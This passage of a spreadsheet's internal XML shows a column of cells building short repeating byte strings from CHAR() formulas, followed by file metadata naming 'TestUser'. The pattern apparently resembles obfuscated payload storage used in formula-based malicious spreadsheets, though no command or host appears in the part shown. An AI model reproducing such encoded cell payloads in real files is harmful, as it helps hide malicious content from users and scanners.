        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="540" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG540" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="541" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG541" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="542" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG542" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="543" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG543" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="544" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG544" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="545" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG545" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="546" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG546" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="547" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG547" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="548" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG548" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(92)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(94)&amp;CHAR(215)</f>
        <v>R×Õ†Ê\Ÿ_x001D_^×</v>
      </c>
    </row>
    <row r="549" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG549" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(154)&amp;CHAR(216)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†šØŸ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="550" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG550" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="551" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG551" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="552" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG552" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="553" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG553" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="554" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG554" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="555" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG555" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="556" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG556" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="557" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG557" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="558" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG558" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="559" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG559" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="560" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG560" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="561" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG561" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="562" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG562" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="563" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG563" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="564" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG564" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="565" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG565" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="566" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG566" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="567" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG567" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="568" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG568" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="569" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG569" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="570" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG570" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="571" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG571" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="572" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG572" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="573" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG573" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="574" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG574" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="575" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG575" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="576" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG576" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="577" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG577" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="578" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG578" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="579" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG579" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="580" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG580" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="581" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG581" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="582" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG582" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="583" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG583" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="584" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG584" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="585" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG585" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="586" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG586" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="587" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG587" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="588" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG588" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="589" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG589" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="590" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG590" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="591" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG591" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="592" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG592" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="593" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG593" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="594" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG594" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="595" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG595" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="596" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG596" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="597" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG597" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="598" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG598" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="599" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG599" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="600" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG600" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
    </row>
    <row r="601" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG601" t="s">
        <v>66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E00C-9770-4EBC-AE94-BDB19AF91BE8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TestUser</dc:creator>
  <cp:lastModifiedBy>TestUser</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-06-03T22:19:34Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-06-03T22:28:34Z</dcterms:modified>
</cp:coreProperties>
</file>